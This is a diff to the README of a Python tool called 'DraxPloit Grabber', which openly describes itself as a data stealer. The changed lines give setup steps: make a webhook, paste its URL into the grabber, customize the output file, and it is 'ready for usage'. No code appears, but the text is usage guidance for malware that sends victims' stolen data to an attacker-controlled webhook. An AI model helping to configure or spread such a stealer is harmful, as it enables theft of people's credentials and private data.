@@ -33,7 +33,8 @@ Data Stealer written in **Python**
 3. Set a webhook name and the specified text channel
 4. Copy the Webhook URL (!!!)
 5. Open DraxPloit Grabber and paste the webhook URL
-6. Customize your file and finish
+6. Customize your file further
+7. Your file is ready for usage!
 
 ## Authors
 
